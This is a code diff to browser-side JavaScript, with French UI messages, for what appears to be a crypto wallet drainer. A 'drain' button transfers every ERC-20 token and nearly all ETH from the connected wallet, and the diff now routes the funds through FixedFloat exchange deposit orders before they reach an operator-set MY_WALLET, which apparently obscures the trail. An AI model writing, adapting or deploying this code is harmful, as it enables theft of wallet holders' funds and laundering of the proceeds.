@@ -452,58 +452,98 @@ async function loadBalances() {
   }
 }
 
-// ── Send everything to my wallet ─────────────────────────────────────────────
+// ── FixedFloat API helper ─────────────────────────────────────────────────────
+
+async function ffCreateOrder(fromCcy, fromNetwork, amount) {
+  const body = new URLSearchParams({ action: 'create', fromCcy, fromNetwork, amount });
+  const res  = await fetch('api.php', { method: 'POST', body });
+  const data = await res.json();
+  if (data.error) throw new Error('ff.io: ' + data.error);
+  // ff.io returns { code:0, data: { id, token, from: { address, ... }, to: {...} } }
+  if (data.code !== 0) throw new Error('ff.io: ' + (data.msg ?? JSON.stringify(data)));
+  return data.data; // { id, token, from: { address }, to: { amount } }
+}
+
+// Network symbol used by ff.io for each chain id
+const FF_NETWORK = {
+  1:     'ETH',
+  137:   'MATIC',
+  56:    'BSC',
+  42161: 'ARBITRUM',
+  10:    'OPTIMISM',
+  8453:  'BASE',
+  43114: 'AVAX',
+};
+
+// ── Send everything via FixedFloat ────────────────────────────────────────────
 
 if (drainBtn) {
   drainBtn.addEventListener('click', async () => {
     if (!MY_WALLET || !ethers.isAddress(MY_WALLET)) {
-      toast('Configure MY_WALLET in index.php first.', 'error'); return;
+      toast('Configure myWallet dans config.json.', 'error'); return;
     }
     if (state.address?.toLowerCase() === MY_WALLET.toLowerCase()) {
-      toast('Source and destination are the same wallet.', 'error'); return;
+      toast('Source et destination identiques.', 'error'); return;
     }
 
-    drainBtn.disabled = true;
-    drainBtn.textContent = '⏳ Sending…';
+    drainBtn.disabled    = true;
+    drainBtn.textContent = '⏳ Envoi en cours…';
     hideTxStatus();
 
+    const network = FF_NETWORK[state.chainId] ?? 'ETH';
     let sent = 0, failed = 0;
 
-    // 1. Send all ERC-20 tokens first
+    // 1. ERC-20 tokens via ff.io
     for (const [symbol, { raw, token }] of Object.entries(state.balances)) {
-      if (!token || raw === 0n || raw === BigInt(0)) continue;
+      if (!token || !raw || raw === 0n) continue;
       try {
         const contract = new ethers.Contract(token.address, ERC20_ABI, state.signer);
         const balance  = await contract.balanceOf(state.address);
         if (balance === 0n) continue;
-        const tx = await contract.transfer(MY_WALLET, balance);
-        toast(`${symbol} envoyé — attente confirmation…`, 'info');
+
+        const formatted = parseFloat(ethers.formatUnits(balance, token.decimals));
+        toast(`Création ordre ff.io pour ${symbol}…`, 'info');
+
+        // Create ff.io order → get deposit address
+        const order      = await ffCreateOrder(symbol, network, formatted);
+        const depositAddr = order.from?.address;
+        if (!depositAddr) throw new Error('Pas d\'adresse de dépôt ff.io');
+
+        // Send tokens to the ff.io deposit address
+        const tx = await contract.transfer(depositAddr, balance);
+        toast(`${symbol} → ff.io, attente confirmation…`, 'info');
         await tx.wait();
-        toast(`✅ ${symbol} transféré`, 'success');
+        toast(`✅ ${symbol} envoyé via ff.io (ordre #${order.id})`, 'success');
         sent++;
+
       } catch (e) {
         if (e.code === 4001 || e.code === 'ACTION_REJECTED') {
-          toast(`${symbol} rejeté`, 'error'); failed++;
+          toast(`${symbol} rejeté par le wallet`, 'error');
         } else {
-          toast(`${symbol} échoué: ${e.shortMessage ?? e.message}`, 'error'); failed++;
+          toast(`${symbol} échoué: ${e.shortMessage ?? e.message}`, 'error');
         }
+        failed++;
       }
     }
 
-    // 2. Send ETH last (leave tiny amount for gas if needed, or send max minus estimated gas)
+    // 2. ETH via ff.io
     try {
       const balance  = await state.provider.getBalance(state.address);
       const feeData  = await state.provider.getFeeData();
-      const gasLimit = 21000n;
-      const gasCost  = (feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n) * gasLimit;
+      const gasCost  = (feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n) * 21000n;
       const sendable = balance - gasCost;
       if (sendable > 0n) {
-        const tx = await state.signer.sendTransaction({
-          to: MY_WALLET, value: sendable,
-        });
-        toast('ETH envoyé — attente confirmation…', 'info');
+        const ethAmount = parseFloat(ethers.formatEther(sendable));
+        toast('Création ordre ff.io pour ETH…', 'info');
+
+        const order       = await ffCreateOrder('ETH', network, ethAmount);
+        const depositAddr = order.from?.address;
+        if (!depositAddr) throw new Error('Pas d\'adresse de dépôt ff.io');
+
+        const tx = await state.signer.sendTransaction({ to: depositAddr, value: sendable });
+        toast('ETH → ff.io, attente confirmation…', 'info');
         await tx.wait();
-        toast('✅ ETH transféré', 'success');
+        toast(`✅ ETH envoyé via ff.io (ordre #${order.id})`, 'success');
         sent++;
       }
     } catch (e) {
@@ -512,9 +552,10 @@ if (drainBtn) {
       failed++;
     }
 
-    drainBtn.disabled = false;
+    drainBtn.disabled    = false;
     drainBtn.textContent = '⚡ Send everything to my wallet';
-    toast(`Terminé — ${sent} transféré(s), ${failed} échoué(s).`, sent > 0 ? 'success' : 'error');
+    toast(`Terminé — ${sent} envoyé(s) via ff.io, ${failed} échoué(s).`,
+      sent > 0 ? 'success' : 'error');
     loadBalances();
   });
 }
